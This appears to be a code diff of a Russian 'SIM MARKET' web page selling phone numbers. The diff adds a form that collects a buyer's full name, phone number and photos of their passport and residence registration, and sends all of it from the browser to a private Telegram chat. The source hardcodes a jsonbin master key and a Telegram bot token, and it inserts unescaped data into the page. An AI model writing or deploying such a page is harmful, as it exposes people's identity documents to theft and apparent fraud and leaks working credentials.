@@ -1,14 +1,15 @@
-     <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SIM MARKET | 14-14</title>
+    <title>SIM MARKET | КУПИТЬ НОМЕР</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body { background: #05070a; color: #e2e8f0; font-family: sans-serif; }
         .glass { background: rgba(15, 23, 42, 0.6); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.05); }
         .gold-text { background: linear-gradient(135deg, #fcd34d 0%, #b45309 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        input[type="file"]::file-selector-button { background: #b45309; border: none; padding: 8px 16px; border-radius: 8px; color: white; cursor: pointer; font-size: 10px; text-transform: uppercase; }
     </style>
 </head>
 <body class="pb-10">
@@ -20,59 +21,123 @@
 
     <main class="max-w-3xl mx-auto p-4 pt-8">
         <div id="list" class="space-y-3">
-            <div class="text-center p-10 text-gray-500 animate-pulse">Подключение к базе...</div>
+            <div class="text-center p-10 text-gray-500 animate-pulse">Загрузка витрины...</div>
         </div>
     </main>
 
+    <div id="modal" style="display:none;" class="fixed inset-0 bg-black/95 z-[100] flex items-center justify-center p-4 overflow-y-auto">
+        <div class="glass p-6 rounded-[2rem] w-full max-w-md my-auto border-t-2 border-yellow-600/30">
+            <h2 class="text-xl font-bold mb-2 gold-text uppercase">Оформление</h2>
+            <p id="target-num" class="mb-6 text-white font-mono text-lg border-b border-white/10 pb-2"></p>
+            
+            <form id="regForm" class="space-y-4">
+                <input type="text" id="fio" placeholder="ФИО по паспорту" class="w-full bg-white/5 p-4 rounded-xl border border-white/10 outline-none focus:border-yellow-600 transition-all" required>
+                <input type="tel" id="client_phone" placeholder="Ваш контактный телефон" class="w-full bg-white/5 p-4 rounded-xl border border-white/10 outline-none focus:border-yellow-600 transition-all" required>
+                
+                <div class="p-4 bg-white/5 rounded-xl border border-white/5">
+                    <label class="text-[10px] text-gray-400 block mb-2 uppercase font-bold">Фото паспорта (лицевая)</label>
+                    <input type="file" id="photo_pass" accept="image/*" class="w-full text-xs text-gray-500" required>
+                </div>
+
+                <div class="p-4 bg-white/5 rounded-xl border border-white/5">
+                    <label class="text-[10px] text-gray-400 block mb-2 uppercase font-bold">Фото прописки</label>
+                    <input type="file" id="photo_reg" accept="image/*" class="w-full text-xs text-gray-500" required>
+                </div>
+
+                <button type="submit" id="sendBtn" class="w-full bg-yellow-600 text-black font-black py-5 rounded-2xl uppercase tracking-widest hover:bg-yellow-500 transition-all active:scale-95">Отправить заявку</button>
+                <button type="button" onclick="closeM()" class="w-full text-gray-500 text-[10px] uppercase font-bold py-2">Закрыть</button>
+            </form>
+        </div>
+    </div>
+
     <script>
+        // Данные базы и Телеграм бота
         const BIN_ID = "69c9d640aaba882197a65742"; 
         const MASTER_KEY = "$2a$10$BIVZfOXmYVaG9NpPRW61Le//5yePRuieGl/ph3o6UYlHw4uOJQKtW"; 
+        const TG_TOKEN = "8569235049:AAEsaW4ME-Ql6036i04tIbj--IPNT6JdroE"; 
+        const TG_CHAT_ID = "8768514374"; 
+
+        let selectedNum = "";
 
         async function loadData() {
-            const list = document.getElementById('list');
             try {
                 const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
                     headers: { 'X-Master-Key': MASTER_KEY }
                 });
-                if (!response.ok) throw new Error();
                 const resData = await response.json();
                 render(resData.record);
-            } catch (err) {
-                list.innerHTML = `<div class="text-center p-10 text-red-500">Ошибка: Обновите данные в jsonbin</div>`;
-            }
+            } catch (err) { console.error(err); }
         }
 
         function render(items) {
             const list = document.getElementById('list');
-            if (!items || items.length === 0) {
-                list.innerHTML = '<div class="text-center p-10 text-gray-500">Список пуст</div>';
-                return;
-            }
             list.innerHTML = items.map(i => `
-                <div class="glass p-5 rounded-2xl flex justify-between items-center border-l-4 ${getBorder(i.op)}">
+                <div onclick="openM('${i.n}')" class="glass p-5 rounded-2xl flex justify-between items-center cursor-pointer active:scale-95 transition-all border-l-4 ${getBorder(i.op)}">
                     <div>
                         <div class="text-xl font-mono font-bold tracking-tighter">${i.n}</div>
                         <div class="text-[10px] text-gray-400 uppercase font-bold">${i.o}</div>
                     </div>
                     <div class="text-right">
-                        <div class="text-xs text-yellow-600 font-black">от ${i.t}₽</div>
+                        <div class="text-[10px] bg-yellow-600/20 text-yellow-500 px-3 py-1 rounded-full font-black uppercase tracking-widest">Купить</div>
                     </div>
                 </div>
             `).join('');
         }
 
+        function openM(num) {
+            selectedNum = num;
+            document.getElementById('target-num').innerText = num;
+            document.getElementById('modal').style.display = 'flex';
+        }
+
+        function closeM() { document.getElementById('modal').style.display = 'none'; }
+
         function getBorder(op) {
-            const colors = {
-                'megafon': 'border-green-500',
-                'beeline': 'border-yellow-400',
-                'mts': 'border-red-600',
-                'tele2': 'border-gray-800'
-            };
+            const colors = {'megafon': 'border-green-500', 'beeline': 'border-yellow-400', 'mts': 'border-red-600', 'tele2': 'border-gray-800'};
             return colors[op] || 'border-white/10';
         }
+
+        document.getElementById('regForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('sendBtn');
+            btn.disabled = true;
+            btn.innerText = "ОТПРАВЛЯЕМ...";
+
+            const fio = document.getElementById('fio').value;
+            const phone = document.getElementById('client_phone').value;
+            const p1 = document.getElementById('photo_pass').files[0];
+            const p2 = document.getElementById('photo_reg').files[0];
+
+            const text = `💰 НОВАЯ ЗАЯВКА\n\nНомер: ${selectedNum}\nФИО: ${fio}\nКлиент: ${phone}`;
+
+            try {
+                // Отправка текстовых данных
+                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text })
+                });
+
+                // Отправка фото паспорта
+                const f1 = new FormData(); f1.append('chat_id', TG_CHAT_ID); f1.append('photo', p1);
+                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: f1 });
+
+                // Отправка фото прописки
+                const f2 = new FormData(); f2.append('chat_id', TG_CHAT_ID); f2.append('photo', p2);
+                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: f2 });
+
+                alert("Заявка успешно отправлена! Мы свяжемся с вами в ближайшее время.");
+                closeM();
+                document.getElementById('regForm').reset();
+            } catch (err) {
+                alert("Ошибка при отправке! Попробуйте позже.");
+            } finally {
+                btn.disabled = false;
+                btn.innerText = "Отправить заявку";
+            }
+        };
 
         window.onload = loadData;
     </script>
 </body>
 </html>
-       
